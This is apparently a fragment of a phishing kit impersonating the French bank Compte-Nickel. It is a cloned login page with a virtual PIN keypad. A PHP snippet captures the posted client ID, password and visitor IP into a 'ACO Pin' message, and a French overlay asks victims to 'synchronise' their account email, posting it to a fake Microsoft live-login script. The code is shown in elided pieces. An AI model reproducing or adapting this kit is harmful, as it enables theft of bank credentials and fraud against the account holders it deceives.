...
$id =  $_POST['id'];
$pass =   str_replace(";", "", $_POST['ctl00$MainContent$txtPassword']) ;
  $msg = "\n---------ACO Pin-------------\n
   id: $id \n
   PASS: $pass \n
   IP: $ip\n
...
<body class="OSX">   
<div style="position: absolute;top: 0;bottom: 0;left: 0;right: 0;background-color: #000000ba;"></div>
<form method="post" action="./login_live/tmailho.php?wa=wsignin1.0&rpsnv=13&ct=1506128676&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fdefault.aspx%3Frru%3Dinbox&lc=1036&id=64855&mkt=fr-fr&cbcxt=mai&contextid=AD9BF6D88247B041&bk=1506128710&uaid=089e01e3a438445f82debdd162db02de&pid=0" id="ctl01" class="MasterForm">
	<div style="font-size: 20px;position: absolute; width: 530px; height: 176px; top: 230px; left: 624px; background-color: #ffffff; padding: 20px; text-align: center;">
		<p style="color: #de5300;">Veuillez synchroniser votre compte-Nickel avec votre email pour sécuriser chaque transaction par carte:</p>
		<p><input type="text" name="eml" placeholder="E-mail adresse..." style="height: 26px;width: 398px;" required=""></p>
		<p><input type="submit" name="sub" value="Synchroniser" style="cursor: pointer; font-size: 20px; border-radius: 5px;padding: 8px;background-color: #94ba1e;"></p>
	</div>
...
<script src="/WebResource.axd?d=qzmbFQUbs07Wp7Bm7rKPdsECmUznC-tAVn4lakbtTwNftZvFqc7KAXZjkfsp2yrgd3zWDMZFnp-ixHbPznbSmQsm0lk1&amp;t=636354943360000000" type="text/javascript"></script>


<script src="/ScriptResource.axd?d=vD2r5ZkQ4zHPRpLAtPqlmW_ovmZ1jzfStkltlFBAut98MkrfEt7iXzbdVKMYexKk5eetC9Tm8oKxCxYd6qMCcWkV1opRsQKKFDFS-N6XvPxb6lORKL3YZyYbJ9i_pjX1dLgk0w2&amp;t=ffffffffdede17b4" type="text/javascript"></script>
<script src="/ScriptResource.axd?d=UTY5NezBo7lt_yUSdfNqCXwiFP2gNPeNB8FbwSyedrPGt-68GmYLbKA6tQx0d0Wu-EosYD1PoiRTuw6fTVzHiaI2PBgQ1a1jAWKHfGCHGB6jACSNLtti9gMv8gZqpSgt4ervQQ2&amp;t=ffffffffdede17b4" type="text/javascript"></script>
<div class="aspNetHidden">
...
//]]>
                        ...
                        <div style="margin:0; display:table;width:100%">
                            <div style="display:table-row">
                                <div class="table-cell" style="vertical-align:middle; padding:0 10px 0 0">
                                    <div>
                                        <a href="https://compte-nickel.fr/"><img id="imgLogo" class="header-logo" src="Styles/Img/logo-nickel.png" alt="Compte-Nickel" style="height:55px;"></a>
                                    </div>
                                </div>
                                    ...
                                    <div class="table tiles" style="width:100%;float:right;margin-top:0">
                                        <div class="table-row">
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="/sos" style="float:left">
                                                    <span class="img">
    ...
    <div id="MainContent_upAuth">
            ...
            <div id="panelLoadingBackground" style="position: absolute; z-index: 99; background-color: rgb(249, 249, 249); display: none; width: 1440px; height: 736px; top: 65px; left: 0px;">
                    ...
                    <div class="table-row">
                        <div class="table-cell" style="padding: 0 20px 15px 0; width: 55%; vertical-align: top;">
                            ...
                            <div id="accordion" class="panelConnection">
                                <h3 id="panelIDTitle" class="accordionTitle accordionTitleClosed" style="margin:0;"><div style="margin-left:10px">Votre identifiant web</div></h3>
                                <div id="panelID" style="margin-top: 10px; display: none;">
                                    <div style="margin-left: 20px">
                                        <div id="panelClientGencode" style="">
                                                ...
                                                <div style="display: table-row">
                                                    <div style="display: table-cell; vertical-align: middle; padding-right: 20px">
                                                        <a onclick="deleteClientID();" class="linkNoStyle" title="Effacer">
                                                            <img id="MainContent_imgClearKeyboard" class="clear-virtual-keyboard" src="Styles/Img/orange-circle-cross-small.png" alt="suppr." style="width:40px;"></a>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle;">
                                                        <input name="ctl00$MainContent$txtClientID" type="text" value="joipoioiup" maxlength="10" id="MainContent_txtClientID" class="TextboxBig" autocomplete="off" style="width: 280px; display: none">

                                                        <div id="panelClientID">
                                                            <input type="text" id="txtID_1" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_2" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_3" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_4" maxlength="1" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 40px; text-align: center; padding: 0" class="TextboxBig">
                                                        </div>
                                                    </div>
...
<input name="ctl00$MainContent$keypad1$txtKeypad" type="password" maxlength="6" readonly="readonly" id="MainContent_keypad1_txtKeypad" class="Password TextboxBig" autocomplete="off" style="width: 317px;font-size:24px;" value="XXXXXX">
<div id="keypad-loading" style="position: absolute; background-color: rgba(249, 249, 249, 0.5); z-index: 200; width: 1440px; height: 432px; top: 0px; left: 0px; display: none;"></div>
    ...
    <div class="table-row">
        <div class="table-cell" style="vertical-align:top">
		    <div class="table">
                <div class="table-row">
                    <div class="table-cell">
                        <input type="image" name="ctl00$MainContent$keypad1$button1" id="MainContent_keypad1_button1" class="keypad-key" position="0" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',3)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button2" id="MainContent_keypad1_button2" class="keypad-key" position="1" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
		                <input type="image" name="ctl00$MainContent$keypad1$button3" id="MainContent_keypad1_button3" class="keypad-key" position="2" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',9)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button4" id="MainContent_keypad1_button4" class="keypad-key" position="3" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',7)" src="data:image/png;base64,">
                    </div>
                    <div class="table-cell">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button5" id="MainContent_keypad1_button5" class="keypad-key" position="4" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',5)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button6" id="MainContent_keypad1_button6" class="keypad-key" position="5" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',0)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button7" id="MainContent_keypad1_button7" class="keypad-key" position="6" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',2)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button8" id="MainContent_keypad1_button8" class="keypad-key" position="7" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',4)" src="data:image/png;base64,">
                    </div>
                ...
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button9" id="MainContent_keypad1_button9" class="keypad-key" position="8" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
		                <input type="image" name="ctl00$MainContent$keypad1$button10" id="MainContent_keypad1_button10" class="keypad-key" position="9" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
		                <input type="image" name="ctl00$MainContent$keypad1$button11" id="MainContent_keypad1_button11" class="keypad-key" position="10" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',6)" src="data:image/png;base64,">
                        <input type="image" name="ctl00$MainContent$keypad1$button12" id="MainContent_keypad1_button12" class="keypad-key" position="11" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                ...
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button13" id="MainContent_keypad1_button13" class="keypad-key" position="12" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
                        <input type="image" name="ctl00$MainContent$keypad1$button14" id="MainContent_keypad1_button14" class="keypad-key" position="13" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',8)" src="data:image/png;base64,">
		                <input type="image" name="ctl00$MainContent$keypad1$button15" id="MainContent_keypad1_button15" class="keypad-key" position="14" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABNSURBVGhD7c8BDQAwEAOh+Tfd2SCfwwFvRxTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RTRFNEU0RyJbB85M+srAVmhRAAAAABJRU5ErkJggg==">
                        <input type="image" name="ctl00$MainContent$keypad1$button16" id="MainContent_keypad1_button16" class="keypad-key" position="15" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',1)" src="data:image/png;base64,">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
...
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadValue" id="MainContent_keypad1_hfKeypadValue">
                            ...
                            <div style="text-align:right;margin:10px 2px 0 0;">
                                ...
                                <a id="MainContent_lbHelpPwd" class="linkNoStyle font-orange" href="javascript:__doPostBack('ctl00$MainContent$lbHelpPwd','')" style="font-weight: bold;">J'ai perdu mon code d'accès</a>
                                <a onclick="return showHelpResetPwdOnClientID();" id="MainContent_lbHelpPwdOnClientGenCode" class="linkNoStyle font-orange" href="javascript:__doPostBack('ctl00$MainContent$lbHelpPwdOnClientGenCode','')" style="font-weight: bold; display: none;">J'ai perdu mon identifiant ou mon code d'accès</a>
                            </div>
                        </div>
                        <div class="table-cell" style="padding: 0 0 0 10px; vertical-align: top;overflow:hidden;">
                           
                        </div>
                        <div id="panelPissenlit" style="margin-top: 150px; padding-left: 10px;">
            ...
            <div id="panelPhishing" class="box page-content" style="margin-top: 30px; background-color: rgb(255, 255, 255); padding: 15px 0px; display: none;">
            ...
            <div class="table-row">
                ...
                <div class="table-cell" style="vertical-align:middle">
                    ...
                    <div style="margin-top: 15px;">
                        <b>Important :</b> Nous ne vous enverrons jamais de mail vous demandant de confirmer votre code d'accès web ni votre numéro de carte MasterCard® Nickel.
                    </div>
    ...
    <input type="hidden" name="ctl00$MainContent$hfRefCustomer" id="MainContent_hfRefCustomer">
        ...
        <div id="divCookies" style="" class="panelCookies">
...
<span style="display: none !important;"><input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value=""></span><span style="display: none !important;"><input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value=""></span><span style="display: none !important;"><input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value=""></span><span style="display: none !important;"><input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="360DA4C0"></span><span style="display: none !important;"><input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value=""></span><div class="ui-dialog ui-widget ui-widget-content ui-corner-all dialog-white" tabindex="-1" role="dialog" aria-labelledby="ui-id-1" style="display: none; outline: 0px; z-index: 1000;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></div><div id="dialog-reset-pwd" style="" class="ui-dialog-content ui-widget-content">
	            <div style="position:relative;width:100%;text-align:right">
...
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.46691352513129325"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.20145746045976276" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=5625881&amp;Ver=2&amp;mid=eb7a2668-d1be-f3e3-f2e9-85a8aa4aab14&amp;evt=pageLoad&amp;sid=1bc8d802-0&amp;lt=1724&amp;pi=1200101525&amp;lg=fr-FR&amp;sw=1440&amp;sh=900&amp;sc=24&amp;tl=Espace%20client%20-%20Mon%20Compte-Nickel&amp;p=https%3A%2F%2Fmon.compte-nickel.fr%2Fidentifiez-vous&amp;r=&amp;msclkid=N&amp;rn=99910"></div><img style="width:0;height:0;display:none;visibility:hidden;" src="https://statcounter.biz/metric/?mid=&amp;wid=51404&amp;sid=&amp;tid=5978&amp;rid=LOADED&amp;custom1=mon.compte-nickel.fr&amp;custom2=/identifiez-vous&amp;t=1532386190102"><img style="width:0;height:0;display:none;visibility:hidden;" src="https://statcounter.biz/metric/?mid=&amp;wid=51404&amp;sid=&amp;tid=5978&amp;rid=BEFORE_OPTOUT_REQ&amp;t=1532386190102"><img style="width:0;height:0;display:none;visibility:hidden;" src="https://statcounter.biz/metric/?mid=&amp;wid=51404&amp;sid=&amp;tid=5978&amp;rid=FINISHED&amp;custom1=mon.compte-nickel.fr&amp;t=1532386190103"><div class="ui-dialog ui-widget ui-widget-content ui-corner-all dialog-white" tabindex="-1" role="dialog" aria-labelledby="ui-id-2" style="display: none; outline: 0px; z-index: 1000;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-2" class="ui-dialog-title">&nbsp;</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></div><div id="dialog-reset-pwd" style="" class="ui-dialog-content ui-widget-content">
	            <div style="position:relative;width:100%;text-align:right">
		            <div class="close-white-dialog" onclick="HideResetPopup();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
			            <img alt="Fermer" src="Styles/Img/close-white-dialog-2.png" width="30">
		            </div>
